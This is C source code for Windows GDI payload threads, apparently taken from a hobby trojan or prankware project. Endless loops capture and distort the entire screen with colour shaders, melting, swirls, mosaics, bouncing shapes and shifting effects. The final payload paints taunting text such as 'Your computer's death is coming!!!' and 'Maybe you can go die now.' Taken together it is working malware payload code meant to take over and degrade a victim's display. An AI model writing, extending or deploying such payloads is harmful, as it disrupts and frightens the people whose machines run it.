DWORD WINAPI GDIShader1(LPVOID lpParam){
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	for(;;){
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = (int)((i ^ 4) + (i * 4) * pow(x ^ y,(1.0/3.0)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0;
}
DWORD WINAPI Payload1a_Melt(LPVOID lpParam){
    for (;;)
    {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);
        HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
        HDC hdcTemp = CreateCompatibleDC(hdc);
        HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
        BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int numShifts = 600;
        for (int i = 0; i < numShifts; i++)
        {
            int x = rand() % w;
            int y = rand() % h;
            int dx = (rand() % 3) - 1;
            int dy = (rand() % 3) - 1;
            BitBlt(hdcTemp, x + dx, y + dy, w - x, h - y, hdcTemp, x, y, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCCOPY);
        SelectObject(hdcTemp, hbmOld);
        DeleteDC(hdcTemp);
        DeleteObject(hbm);
        ReleaseDC(NULL, hdc);
    }
}
DWORD WINAPI Payload1b_Triangles(LPVOID lpParam) //by fr4ctalz
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	float rotationAngle = 0.0f;
	float rotationSpeed = 0.02f;
	while (1)
	{
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		POINT vertices[] =
		{
			{
				top_x, bottom_y
			},
			{
				bottom_x, bottom_y
			},
			{
				(top_x + bottom_x) / 2, top_y
			}
		};
		POINT center =
		{
			(top_x + bottom_x) / 2, (top_y + bottom_y) / 2
		};
		RotatePoints(vertices, sizeof(vertices) / sizeof(vertices[0]), center, rotationAngle);
		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}
		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}
		if (y == 0)
		{
			signY = 1;
		}
		if (x == 0)
		{
			signX = 1;
		}
		rotationAngle += rotationSpeed;
		Sleep(1);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI GDIShader2(LPVOID lpParam){
	HDC hdcScreen = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen={0};
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

//	prgbScreen = {0};

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int t = 0;; t++) {
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int r = GetRValue(prgbScreen[i].rgb);
			int g = GetGValue(prgbScreen[i].rgb);
			int b = GetBValue(prgbScreen[i].rgb);
			prgbScreen[i].rgb = (RGB((2 * r) % 256, (b + t) % 256, (g + i) % 256) + int(sqrt(i >> t / (r + 1))) / 10) % (RGB(255, 255, 255));
		}
		Sleep(100);
		BitBlt(hdcScreen, 0, 0, w, h, hdcTempScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}
}
DWORD WINAPI GDIShader3(LPVOID lpParam){
	HDC hdcScreen = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen={0};
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

//	prgbScreen = {0};

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int t = 0;; t++) {
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			prgbScreen[i].rgb = (t * i) % (RGB(255, 255, 255));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcTempScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}
}
DWORD WINAPI Payload2a_Textout(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    LPCSTR lpText = "oegfig8287 by linjian";
    int changdu = strlen(lpText);
    while (1) {
        x += incrementor * signX;
        y += incrementor * signY;
        int top_x = 0 + x;
        int top_y = 0 + y;
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFontA(70, 30, 0, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Microsoft YaHei");
        SelectObject(hdc, font);
        TextOutA(hdc, top_x, top_y, lpText, changdu);
        if (y >= GetSystemMetrics(SM_CYSCREEN) - 60)
        {
            signY = -1;
        }
        if (x >= GetSystemMetrics(SM_CXSCREEN) - 630)
        {
            signX = -1;
        }
        if (y == 0)
        {
            signY = 1;
        }
        if (x == 0)
        {
            signX = 1;
        }
        Sleep(10);
        DeleteObject(font);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI Payload3a_Swirl(LPVOID lpParam) {//by pankoza
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 10, ySize = 9;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		int i;
		for (i = 0; i < sh * 2; i++) {
			int wave = sin(i / ((float)xSize) * PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCCOPY);
		}
		for (i = 0; i < sw * 2; i++) {
			int wave = sin(i / ((float)xSize) * PI) * (ySize);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
		Sleep(1);
	}
}
DWORD WINAPI GDIShader4(LPVOID lpParam){
	HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	PRGBQUAD prgbScreen;
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hcdc, hBitmap);
	for (int t = 0;; t++) {
		hdc = GetDC(NULL);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            prgbScreen[i].r+=10;
            prgbScreen[i].g+=10;
            prgbScreen[i].b+=10;
        }
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteObject(hdc);
		Sleep(10);
	}
	DeleteObject(hBitmap);
	DeleteDC(hcdc);
    return 0;
}
DWORD WINAPI Payload4a_Mosaic(LPVOID lpParam){
	for (int t = 0;; t++) {
		HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    	HDC hcdc = CreateCompatibleDC(hdc);
    	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
    	SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for(int x = 0; x <= w; x += 10){
            for(int y = 0; y <= h; y += 10){
                StretchBlt(hcdc, x, y, 10, 10, hcdc, x, y, 1, 1, SRCCOPY);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(100);
	}
}
DWORD WINAPI GDIShader5(LPVOID lpParam){
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    for (;;)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = i | (i * (x | y));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
                hslcolor.s = 0.7f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0;
}
DWORD WINAPI GDIShader6(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i & h,y = i | w;
            rgbScreen[i].rgb+=x*y+rand()%20;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}
DWORD WINAPI GDIShader7(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = (x + i*4) + (y + i*4);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		BLENDFUNCTION blf = { 0 };
		blf.BlendOp = AC_SRC_OVER;
		blf.BlendFlags = 0;
		blf.SourceConstantAlpha = 180;
		blf.AlphaFormat = 0;
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blf);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0;
}
DWORD WINAPI Payload5a_IconCube(LPVOID lpParam) 
{
    HDC dc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(dc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    HINSTANCE HSHELL32 = LoadLibrary(_T("shell32.dll"));
    float size = (w + h) / 10;
    int cx = size;
    int cy = size;
    int xdv = 10;
    int ydv = 10;
    float angleX = 0.01;
    float angleY = 0.01;
    float angleZ = 0.01;
    int d = 60;
    VERTEX vtx[] =
    {
        {size, 0, 0},
        {size, size, 0},
        {0, size, 0},
        {0, 0, 0},
        {size, 0, size},
        {size, size, size},
        {0, size, size},
        {0, 0, size},
        {size - d,  d,      d},
        {size - d,  size - d,  d},
        {d,      size - d,  d},
        {d,      d,      d},
        {size - d,  d,      size - d},
        {size - d,  size - d,  size - d},
        {d,      size - d,  size - d},
        {d,      d,      size - d}
    };
    EDGE edges[] =
    {
        {0, 1},{1, 2},{2, 3},{3, 0},{0, 4},{1, 5},{2, 6},{3, 7},{4, 5},{5, 6},{6, 7},{7,4},{8,9},{9,10},{10,11},{11,8},{8,12},{9,13},{10,14},{11,15},{12,13},{13,14},{14,15},{15,12},{0,8},{1,9},{2,10},{3,11},{4,12},{5,13},{6,14},{7,15}
    };
    LPCTSTR icons[] = { IDC_ARROW, IDC_WAIT, IDC_NO, IDC_HELP };
    int index = rand() % 4;
    int totvtx = sizeof(vtx) / sizeof(vtx[0]);
    int totedg = sizeof(edges) / sizeof(edges[0]);
    for (;;)
    {
		int i;
        dc = GetDC(NULL);
        for (i = 0; i < totvtx; i++)
        {
            _3D::RotateX(&vtx[i], angleX);
            _3D::RotateY(&vtx[i], angleY);
            _3D::RotateZ(&vtx[i], angleZ);
        }
        for (i = 0; i < totedg; i++)
        {
            _3D::DrawEdge(dc, icons[index],
                vtx[edges[i].vtx0].x + cx, vtx[edges[i].vtx0].y + cy,
                vtx[edges[i].vtx1].x + cx, vtx[edges[i].vtx1].y + cy, 20);
        }
        Sleep(40);
        cx += xdv;
        cy += ydv;
        if (cx > w - (size / 2) || cx < -(size / 2))
        {
            xdv *= -1;
            index = rand() % 4;
        }
        if (cy > h - (size / 2) || cy < -(size / 2))
        {
            ydv *= -1;
            index = rand() % 4;
        }
        ReleaseDC(0, dc);
    }

    return 0;
}
DWORD WINAPI Payload6a_Melt2(LPVOID lpParam) //by fr4ctalz,from pankoza
{
	while (1)
	{
		HDC hdc = GetDC(NULL);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
		HDC hdcTemp = CreateCompatibleDC(hdc);
		HBITMAP hbmOld = (HBITMAP)SelectObject(hdcTemp, hbm);
		BitBlt(hdcTemp, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int numShifts = 600;
		for (int i = 0; i < numShifts; i++)
		{
			int x = rand() % w;
			int y = rand() % h;
			int dx = (rand() % 3) - 1;
			int dy = (rand() % 3) - 1;
			BitBlt(hdcTemp, x + dx, y + dy, w - x, h - y, hdcTemp, x, y, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCAND);
		SelectObject(hdcTemp, hbmOld);
		DeleteDC(hdcTemp);
		DeleteObject(hbm);
		ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI GDIShader8(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = (int)(sqrt(x & (i * 4)) * pow(y & (i * 4),1.0/3));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0;
}
DWORD WINAPI Payload7a_Swirl2(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 10, ySize = 9;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCINVERT);
		int i;
		for (i = 0; i < sh * 2; i++) {
			int wave = sin(i / ((float)xSize) * PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCPAINT);
		}
		for (i = 0; i < sw * 2; i++) {
			int wave = sin(i / ((float)xSize) * PI) * (ySize);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCPAINT);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCERASE);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
	}
}
DWORD WINAPI GDIShader9(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hcdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP hBitmap;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    hBitmap = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(hcdc, hBitmap);
    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;
    srand(time(NULL));
    while (1) {
        hdc = GetDC(NULL);
        HBRUSH hbr = CreateSolidBrush(Hue(rand() % 255));
        SelectObject(hcdc, hbr);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, PATCOPY);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        DeleteObject(hbr);
        ReleaseDC(0, hdc);
        Sleep(1);
    }
}
VOID WINAPI train(HDC hdc, int w, int h, int xPower, int yPower, DWORD dwRop) {
    if (xPower >= w) xPower = w - 1; if (yPower >= h) yPower = h - 1;
    HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
    HDC hdc2 = CreateCompatibleDC(hdc); 
    SelectObject(hdc2, screenshot);
    BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    BitBlt(hdc, xPower > 0 ? xPower : 0, yPower > 0 ? yPower : 0, w - abs(xPower), h - abs(yPower), hdc, xPower < 0 ? -xPower : 0, yPower < 0 ? -yPower : 0, dwRop);
    BitBlt(hdc, xPower < 0 ? w + xPower : 0, 0, abs(xPower), h, hdc2, xPower > 0 ? w - xPower : 0, 0, dwRop);
    BitBlt(hdc, 0, yPower < 0 ? h + yPower : 0, w, abs(yPower), hdc2, 0, yPower > 0 ? h - yPower : 0, dwRop);
    DeleteDC(hdc2); 
    DeleteObject(screenshot);
}
DWORD WINAPI Payload8a_Train(LPVOID lpParam) { //by N17Pro3426
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    while (1) {
        for (int angle = 0; angle < 720; angle++) {
            int x = 100 * cos(angle * 3.1415926 / 180.F), y = 100 * sin(angle * 3.1415926 / 180.F);
            hdc = GetDC(0);
            train(hdc, w, h, x, y, SRCCOPY);
            ReleaseDC(0, hdc);
            Sleep(1);
        }
    }
}
DWORD WINAPI GDIShader10(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = 22;
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / h * .10f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload9a_TextOut2(LPVOID lpParam) {
    srand(time(NULL));
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(NULL);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        SetBkMode(hcdc, 1);
        LPCSTR text[16] = {"1145141919810", "AMOG US!!!", "Did you think you can escape easily? ", "Don't be so silly!", "Do you like this feeling?", "GET R3KT L0L" , "Haha! You idiot!" , "Maybe you can go die now." , "Never gonna give you up" , "STOP POSTING ABOUT AMONG US!!!" , "Stop strugging and crying!", "Still using this computer?", "That was fun, Isn't it?" , "There's no MERCY!!!" , "Where are you going? Get back here!" , "Your computer's death is coming!!!"};
        int tmp = rand() % 16;
        SetTextColor(hcdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFontA(70, 30, 0, 0, FW_NORMAL, 0, 0, 0, ANSI_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "Microsoft Yahei");
        SelectObject(hcdc, font);
        TextOutA(hcdc, rand() % w, rand() % h, text[tmp], strlen(text[tmp]));
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        ReleaseDC(NULL, hcdc);
        DeleteObject(font);
        DeleteObject(hdc);
        DeleteObject(hcdc);
        DeleteObject(hBitmap);
        Sleep(20);
    }
}